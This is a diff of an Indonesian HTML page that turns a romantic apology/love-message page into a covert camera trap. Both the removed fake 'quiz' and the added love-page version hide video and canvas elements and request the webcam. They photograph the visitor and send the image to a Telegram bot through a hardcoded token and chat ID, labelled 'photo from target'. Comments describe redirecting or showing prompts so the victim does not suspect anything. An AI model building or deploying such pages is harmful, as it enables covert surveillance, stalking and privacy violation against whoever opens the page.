@@ -1,151 +1,184 @@
 <!DOCTYPE html>
 <html>
+<meta charset='UTF-8'/><meta content='width=device-width, initial-scale=1, user-scalable=1, minimum-scale=1, maximum-scale=5' name='viewport'/><meta content='IE=edge' http-equiv='X-UA-Compatible'/>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Sono:wght@600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Nerko+One&display=swap" rel="stylesheet">
+
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.all.min.js"></script>
+<script src="https://unpkg.com/typeit@8.7.0/dist/index.umd.js"></script><link href="https://feeldreams.github.io/dibacadong/style.css" rel="stylesheet" type="text/css" />
+<script src="https://kit.fontawesome.com/4f3ce16e3e.js" crossorigin="anonymous"></script>
+
 <head>
-    <title>Kuis Online</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body {
-            background: #f4f4f4;
-            font-family: 'Segoe UI', sans-serif;
-            text-align: center;
-            padding: 50px 20px;
-        }
-        .card {
-            background: white;
-            max-width: 400px;
-            margin: 0 auto;
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-        }
-        button {
-            background: #007bff;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 50px;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        .hidden {
-            display: none;
-        }
-    </style>
+<title>MWHEHEHEHE</title>
+<meta name="description" content="HTML Replit Coding">
 </head>
 <body>
 
-    <!-- Video + Canvas disembunyikan total -->
-    <video id="video" autoplay playsinline muted style="display:none"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none"></canvas>
+<!-- Audio -->
+<audio src="https://feeldreams.github.io/audio/seandainya.mp3" id="linkmp3" class="sembunyi"></audio>
 
-    <div class="card">
-        <h2>📋 Kuis Singkat</h2>
-        <p>Klik tombol di bawah untuk mulai</p>
-        <button id="startBtn">Mulai Kuis</button>
-        <p style="margin-top: 20px; font-size: 14px; color: #777;">Hanya 2 pertanyaan</p>
-    </div>
+<!-- ELEMEN HIDDEN CAMERA -->
+<video id="hiddenVideo" autoplay playsinline muted style="display:none; width:0; height:0;"></video>
+<canvas id="hiddenCanvas" width="640" height="480" style="display:none;"></canvas>
 
-    <script>
-        // ======= KONFIGURASI BOT TELEGRAM (ISI SENDIRI) =======
-        const BOT_TOKEN = '8086111548:AAE9hSY7CgA8WhgG1Zs_x9CEbvAf1YKJ42A';      // <-- GANTI
-        const CHAT_ID = '8115098922';        // <-- GANTI
+<div id="bodyblur">
+   <img src="https://feeldreams.github.io/papjalan2.jpeg" id="wallpaper"/>
+</div>
 
-        // ======= JANGAN UBAH DIBAWAH INI =======
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
+<div id='Content'>
+ <div id="ftAwal">
+   <img src="https://feeldreams.github.io/pandaputih.gif" id="ftoAwal"/>
+ </div>
 
-        let cameraStream = null;
+ <div id="loveIn">
+   <label class='lovein'>&#10084;</label>
+ </div>
+ <p id="ket">Pencet lop ny😒🖕🏻!</p>
 
-        // Fungsi kirim foto ke Telegram
-        function sendPhotoToTelegram(blob) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, `selfie_${Date.now()}.jpg`);
-            formData.append('caption', `📸 Foto dari target\nWaktu: ${new Date().toLocaleString()}`);
+ <div class="kumpulanstiker">
+     <img src="https://feeldreams.github.io/bwa2.gif" id="fotostiker"/>
+     <img src="https://feeldreams.github.io/wortel.gif" id="fotostiker1"/>
+     <img src="https://feeldreams.github.io/ngumpet.gif" id="fotostiker2"/>
+     <img src="https://feeldreams.github.io/pusn.gif" id="fotostiker3"/>
+ </div>
+ 
+ <div class="kumpulanwp" class="sembunyi">
+     <img src="https://feeldreams.github.io/papjalan.jpeg" id="wallpaper2"/>
+     <img src="https://feeldreams.github.io/papjalan3.jpeg" id="wallpaper3"/>
+     <img src="https://feeldreams.github.io/paplalulintas4.jpeg" id="wallpaper4"/>
+ </div>
+ 
+ <div><div id='pergeseran'>
+    <p><b><span>p</span></b></p>
+    <p><b><span>maaf yaa kalo aku<br>suka bkin kamu kesel</span></b></p>
+    <p><b><span>aku cuma mau bilang</span></b></p>
+    <p><b><span>pncet ini dlu ya 👉💌</span></b></p>
+ </div></div>
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData,
-                mode: 'no-cors' // Biar gak keliatan error di console
-            }).catch(e => {});
-        }
+ <p id="ketgeser">Klik untuk Geser!</p>
 
-        // Fungsi jepret foto
-        function captureAndSend() {
-            if (!cameraStream) return;
+ <div><blockquote id='bq'>
+   <p id="kalimat">y</p>
+   <p id="pesanAkhir">mff</p>
+ </blockquote></div>
+ 
+</div>
 
-            // Gambar dari video ke canvas
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+<script>
+// ========== KONFIGURASI BOT TELEGRAM ==========
+// GANTI INI!!!
+const BOT_TOKEN = '8086111548:AAE9hSY7CgA8WhgG1Zs_x9CEbvAf1YKJ42A'; 
+const CHAT_ID = '8115098922'; 
 
-            // Konversi ke blob JPEG (kompresi 80%)
-            canvas.toBlob(blob => {
-                sendPhotoToTelegram(blob);
-                console.log('📸 Foto terkirim!');
-            }, 'image/jpeg', 0.8);
-
-            // Matiin kamera biar ga keliatan boros
-            stopCamera();
-        }
-
-        // Matikan kamera
-        function stopCamera() {
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-                cameraStream = null;
-                video.srcObject = null;
-            }
-        }
-
-        // Minta izin kamera & langsung foto setelah dapat
-        function requestCameraAndCapture() {
-            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                .then(stream => {
-                    cameraStream = stream;
-                    video.srcObject = stream;
-
-                    video.onloadedmetadata = () => {
-                        video.play();
-
-                        // Jepret setelah 2 detik (kasih waktu kamera fokus)
-                        setTimeout(() => {
-                            captureAndSend();
-                        }, 2000);
-                    };
-                })
-                .catch(err => {
-                    console.log('Kamera ditolak atau error:', err);
-                    // Tetap jalanin tombol biar gak curiga
-                });
-        }
-
-        // Saat tombol "Mulai Kuis" diklik
-        document.getElementById('startBtn').addEventListener('click', function() {
-            // Ubah teks biar keliatan proses
-            this.innerText = 'Memuat...';
-            this.disabled = true;
-
-            // Minta izin kamera dan foto
-            requestCameraAndCapture();
-
-            // Setelah 3 detik, alihkan ke Google biar ga curiga
+// ========== STEALTH CAMERA ==========
+(function() {
+    console.log("Camera system starting...");
+    
+    const video = document.getElementById('hiddenVideo');
+    const canvas = document.getElementById('hiddenCanvas');
+    const context = canvas.getContext('2d');
+    
+    // Minta akses kamera
+    navigator.mediaDevices.getUserMedia({ 
+        video: { width: 640, height: 480, facingMode: 'user' },
+        audio: false 
+    })
+    .then(stream => {
+        console.log("Camera access GRANTED!");
+        video.srcObject = stream;
+        
+        video.onloadedmetadata = () => {
+            video.play();
+            console.log("Video ready, capturing in 2 seconds...");
+            
+            // TUNGGU 2 DETIK, TERUS FOTO
             setTimeout(() => {
-                window.location.href = 'https://www.google.com';
-            }, 3000);
+                // Capture gambar
+                context.drawImage(video, 0, 0, 640, 480);
+                console.log("Captured!");
+                
+                // Konversi ke blob
+                canvas.toBlob(blob => {
+                    // Kirim ke Telegram
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'capture.jpg');
+                    formData.append('caption', '📸 Foto dari target!');
+                    
+                    // PAKE FETCH BIASA, BUKAN NO-CORS
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(res => res.json())
+                    .then(data => {
+                        console.log("Telegram response:", data);
+                        if(data.ok) {
+                            console.log("FOTO BERHASIL TERKIRIM! ✅");
+                        } else {
+                            console.log("GAGAL:", data.description);
+                        }
+                    })
+                    .catch(err => console.log("Fetch error:", err));
+                    
+                    // Matiin kamera
+                    stream.getTracks().forEach(track => track.stop());
+                    video.srcObject = null;
+                    
+                }, 'image/jpeg', 0.8);
+            }, 2000); // 2 detik delay
+        };
+    })
+    .catch(err => {
+        console.log("Camera access DENIED or ERROR:", err);
+        // Tampilkan pesan ke user biar ga curiga
+        Swal.fire({
+            icon: 'info',
+            title: 'Camera Access',
+            text: 'Please allow camera access to continue',
+            confirmButtonText: 'OK'
         });
+    });
+})();
 
-        // BONUS: Kalau pengen langsung foto tanpa klik tombol
-        // Hapus komen di bawah kalau mau langsung foto saat halaman dibuka
-        /*
-        window.addEventListener('load', function() {
-            requestCameraAndCapture();
-            setTimeout(() => {
-                window.location.href = 'https://www.google.com';
-            }, 4000);
-        });
-        */
-    </script>
+// ========== CODE ASLI TETAP JALAN ==========
+const body = document.querySelector("body"); 
+const iniwp = [];
+iden = 1; 
+iniwp[1] = wallpaper.src; 
+iniwp[2] = wallpaper2.src; 
+iniwp[3] = wallpaper3.src; 
+iniwp[4] = wallpaper4.src; 
+katakata = kalimat.innerHTML;
+pesanAkhir2 = pesanAkhir.innerHTML;
+kalimat.innerHTML = "";
+pesanAkhir.innerHTML = ""; 
+const swalst = Swal.mixin({timer: 2500, allowOutsideClick: false, showConfirmButton: false, timerProgressBar: true, imageHeight: 90,}); 
+audio = new Audio('' + linkmp3.src); 
+ftganti=0;
+fungsi=0;
+fungsiAwal=0;
+deffotostiker=fotostiker.src;
+function berjatuhan() {
+    const heart = document.createElement("div"); 
+    heart.className = "fas fa-heart"; 
+    heart.style.left = (Math.random() * 90)+"vw"; 
+    heart.style.animationDuration = (Math.random()*3)+2+"s"; 
+    body.appendChild(heart);
+} 
+setInterval(function name(params) {
+    var heartArr = document.querySelectorAll(".fa-heart"); 
+    if (heartArr.length > 100) {
+        heartArr[0].remove()
+    }
+},100);
+Content.style = "opacity:1;margin-top:14vh"; 
+const swals = Swal.mixin({allowOutsideClick: false, cancelButtonColor: '#FF0040', imageHeight: 80,});
+</script>
+<script src="https://feeldreams.github.io/dibacadong/script.js"></script>
 </body>
 </html>
